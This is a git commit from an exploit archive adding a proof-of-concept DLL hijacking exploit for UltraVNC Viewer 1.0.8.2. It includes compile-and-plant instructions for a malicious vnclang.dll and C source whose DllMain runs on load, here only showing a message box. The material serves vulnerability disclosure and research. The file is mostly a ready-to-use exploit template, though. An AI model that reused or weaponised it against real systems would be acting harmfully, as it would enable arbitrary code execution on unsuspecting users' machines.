8d2f2b9c4bdde7790af9f76b4fb804192d8fc547
Offensive Security <info@exploit-db.com>
2014-09-08 04:43:45 +0000

    Updated 09_08_2014

---
+++ platforms/windows/remote/34542.c
@@ -0,0 +1,45 @@
+source: http://www.securityfocus.com/bid/42846/info
+
+UltraVNC is prone to a vulnerability that lets attackers execute arbitrary code.
+
+An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.
+
+UltraVNC 1.0.8.2 is vulnerable; other versions may be affected. 
+
+/*
+====================================================================
+UltraVNC Viewer - Connection 105 DLL Hijacking Exploit (vnclang.dll) 
+====================================================================
+
+$ Program: UltraVNC Viewer
+$ Version: Connection 105
+$ Download: http://www.uvnc.com/
+$ Date: 2010/10/08
+ 
+Found by Pepelux <pepelux[at]enye-sec.org>
+http://www.pepelux.org
+eNYe-Sec - www.enye-sec.org
+
+Tested on: Windows XP SP2 && Windows XP SP3
+
+How  to use : 
+
+1> Compile this code as vnclang.dll
+	gcc -shared -o vnclang.dll thiscode.c
+2> Move DLL file to the directory where UltraVNC is installed
+3> Open any file recognized by UltraVNC
+*/
+
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+int mes()
+{
+  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
+  return 0;
+}
+BOOL WINAPI  DllMain (
+			HANDLE    hinstDLL,
+            DWORD     fdwReason,
+            LPVOID    lpvReserved)
+			{mes();}
